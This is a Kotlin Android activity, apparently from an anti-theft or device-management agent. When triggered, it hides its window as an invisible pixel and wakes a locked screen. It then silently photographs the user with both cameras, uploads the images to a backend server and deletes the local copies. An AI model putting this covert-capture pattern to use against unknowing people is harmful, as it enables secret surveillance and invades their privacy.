package com.edr.agent.camera

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.ImageFormat
import android.graphics.drawable.ColorDrawable
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.WindowManager
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class IntruderCaptureActivity : Activity() {

    private lateinit var cameraManager: CameraManager
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    private var frontCameraId: String? = null
    private var backCameraId: String? = null

    private var frontPhotoBytes: ByteArray? = null
    private var backPhotoBytes: ByteArray? = null

    private var frontFile: java.io.File? = null
    private var backFile: java.io.File? = null

    private var currentCameraDevice: CameraDevice? = null
    private var currentCaptureSession: CameraCaptureSession? = null
    private var currentImageReader: ImageReader? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    private val timeoutHandler = Handler(Looper.getMainLooper())
    private val timeoutRunnable = Runnable {
        Log.w(TAG, "Watchdog timeout reached during silent capture. Forcing upload & finish.")
        finishAndUpload()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!isCapturing.compareAndSet(false, true)) {
            Log.w(TAG, "Intruder capture is already running. Ignoring duplicate trigger.")
            finish()
            return
        }

        val triggerReason = intent.getStringExtra("trigger_reason") ?: "Manual Admin Request"

        // Make window completely invisible & wake up screen if locked
        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        window.setLayout(1, 1)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            )
        }

        // Start safety watchdog for 12 seconds
        timeoutHandler.postDelayed(timeoutRunnable, 12000)

        // Ensure local /EDR folder and info are initialized
        EdrLocalStorage.saveEdrInfo(this)
        EdrLocalStorage.appendEdrLog(this, "INTRUDER", "Intruder capture sequence initiated ($triggerReason).")

        startBackgroundThread()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted. Cannot capture intruder photo.")
            finish()
            return
        }

        discoverCameras()
        // Begin sequential capture starting with Front Camera (intruder's face)
        captureFrontCamera()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("IntruderCaptureThread").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join(1000)
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Background thread stop interrupted: ${e.message}")
        }
    }

    private fun discoverCameras() {
        try {
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontCameraId == null) {
                    frontCameraId = id
                } else if (facing == CameraCharacteristics.LENS_FACING_BACK && backCameraId == null) {
                    backCameraId = id
                }
            }
            Log.i(TAG, "Discovered cameras: Front=$frontCameraId, Back=$backCameraId")
        } catch (e: Exception) {
            Log.e(TAG, "Failed discovering cameras: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun captureFrontCamera() {
        val id = frontCameraId
        if (id == null) {
            Log.w(TAG, "No front camera found, proceeding directly to back camera")
            captureBackCamera()
            return
        }

        openCameraAndSnap(id, isFront = true) {
            captureBackCamera()
        }
    }

    @SuppressLint("MissingPermission")
    private fun captureBackCamera() {
        val id = backCameraId
        if (id == null) {
            Log.w(TAG, "No back camera found, proceeding to upload")
            finishAndUpload()
            return
        }

        openCameraAndSnap(id, isFront = false) {
            finishAndUpload()
        }
    }

    @SuppressLint("MissingPermission")
    private fun openCameraAndSnap(cameraId: String, isFront: Boolean, onComplete: () -> Unit) {
        val handler = backgroundHandler ?: run {
            onComplete()
            return
        }

        try {
            // Pick a moderate resolution like 1280x720 or 1920x1080
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = sizes?.filter { it.width in 800..1920 }?.maxByOrNull { it.width * it.height }
                ?: sizes?.firstOrNull()
            val width = targetSize?.width ?: 1280
            val height = targetSize?.height ?: 720

            val reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            currentImageReader = reader

            reader.setOnImageAvailableListener({ ir ->
                val image = ir.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val timeSafe = SyncPreferences.getCurrentIsoTimestamp().replace(":", "-").replace(".", "-")
                    if (isFront) {
                        frontPhotoBytes = bytes
                        try {
                            val f = java.io.File(EdrLocalStorage.getPhotosDir(this@IntruderCaptureActivity), "front_${timeSafe}.jpg")
                            f.writeBytes(bytes)
                            frontFile = f
                            Log.i(TAG, "Captured FRONT photo & stored in ${f.absolutePath} (${bytes.size} bytes)")
                            EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "CAMERA", "FRONT photo stored in ${f.absolutePath}")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed storing front photo in /EDR: ${e.message}")
                        }
                    } else {
                        backPhotoBytes = bytes
                        try {
                            val f = java.io.File(EdrLocalStorage.getPhotosDir(this@IntruderCaptureActivity), "back_${timeSafe}.jpg")
                            f.writeBytes(bytes)
                            backFile = f
                            Log.i(TAG, "Captured BACK photo & stored in ${f.absolutePath} (${bytes.size} bytes)")
                            EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "CAMERA", "BACK photo stored in ${f.absolutePath}")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed storing back photo in /EDR: ${e.message}")
                        }
                    }
                }
                closeCamera()
                onComplete()
            }, handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    currentCameraDevice = camera
                    try {
                        val surface = reader.surface
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        }

                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(
                            listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    currentCaptureSession = session
                                    try {
                                        session.capture(captureBuilder.build(), null, handler)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Session capture failed: ${e.message}")
                                        closeCamera()
                                        onComplete()
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    Log.e(TAG, "Camera capture session configuration failed")
                                    closeCamera()
                                    onComplete()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Create capture session failed: ${e.message}")
                        closeCamera()
                        onComplete()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    closeCamera()
                    onComplete()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera open error: $error on camera $cameraId")
                    closeCamera()
                    onComplete()
                }
            }, handler)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "CameraAccessException on camera $cameraId: ${e.message}")
            closeCamera()
            onComplete()
        } catch (e: Exception) {
            Log.e(TAG, "General exception opening camera $cameraId: ${e.message}")
            closeCamera()
            onComplete()
        }
    }

    private fun closeCamera() {
        try {
            currentCaptureSession?.close()
            currentCaptureSession = null
            currentCameraDevice?.close()
            currentCameraDevice = null
            currentImageReader?.close()
            currentImageReader = null
        } catch (e: Exception) {
            Log.w(TAG, "Error closing camera: ${e.message}")
        }
    }

    private fun finishAndUpload() {
        timeoutHandler.removeCallbacks(timeoutRunnable)
        closeCamera()

        val front = frontPhotoBytes
        val back = backPhotoBytes

        if (front == null && back == null) {
            Log.w(TAG, "No photos captured to upload.")
            cleanUpAndExit()
            return
        }

        val triggerReason = intent.getStringExtra("trigger_reason") ?: "Manual Admin Request"

        // Upload to backend server in background thread
        Thread {
            try {
                val payload = mutableMapOf<String, Any>(
                    "deviceId" to SyncPreferences.deviceId,
                    "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                    "triggerReason" to triggerReason
                )

                if (front != null) {
                    payload["frontPhotoBase64"] = Base64.encodeToString(front, Base64.NO_WRAP)
                }
                if (back != null) {
                    payload["backPhotoBase64"] = Base64.encodeToString(back, Base64.NO_WRAP)
                }

                val uploadUrl = "${SyncPreferences.httpBaseUrl}/api/devices/${SyncPreferences.deviceId}/photos"
                val request = Request.Builder()
                    .url(uploadUrl)
                    .post(gson.toJson(payload).toRequestBody(jsonMediaType))
                    .build()

                val response = httpClient.newCall(request).execute()
                Log.i(TAG, "Photo evidence uploaded to server ($triggerReason). HTTP Status: ${response.code}")
                response.close()
                EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "UPLOAD", "Intruder photos uploaded to server ($triggerReason). HTTP ${response.code}")

                // Delete local photos from /EDR/ folder immediately after successful upload
                try {
                    frontFile?.let { f ->
                        if (f.exists()) {
                            val deleted = f.delete()
                            Log.i(TAG, "Deleted front photo from /EDR: $deleted (${f.name})")
                            EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "STORAGE", "Deleted front photo from /EDR/photos/: $deleted")
                        }
                    }
                    backFile?.let { f ->
                        if (f.exists()) {
                            val deleted = f.delete()
                            Log.i(TAG, "Deleted back photo from /EDR: $deleted (${f.name})")
                            EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "STORAGE", "Deleted back photo from /EDR/photos/: $deleted")
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error deleting local photos: ${e.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed uploading photos to server: ${e.message}", e)
                EdrLocalStorage.appendEdrLog(this@IntruderCaptureActivity, "ERROR", "Failed uploading photos: ${e.message}")
            } finally {
                // Ensure all byte arrays and temp files are expunged
                try {
                    if (frontFile?.exists() == true) frontFile?.delete()
                    if (backFile?.exists() == true) backFile?.delete()
                } catch (ignored: Exception) {}
                frontPhotoBytes = null
                backPhotoBytes = null
                frontFile = null
                backFile = null
                cleanUpAndExit()
            }
        }.start()
    }

    private fun cleanUpAndExit() {
        runOnUiThread {
            stopBackgroundThread()
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isCapturing.set(false)
        timeoutHandler.removeCallbacks(timeoutRunnable)
        closeCamera()
        stopBackgroundThread()
        // Never keep photo bytes in RAM
        frontPhotoBytes = null
        backPhotoBytes = null
    }

    companion object {
        private const val TAG = "IntruderCapture"
        val isCapturing = AtomicBoolean(false)
    }
}

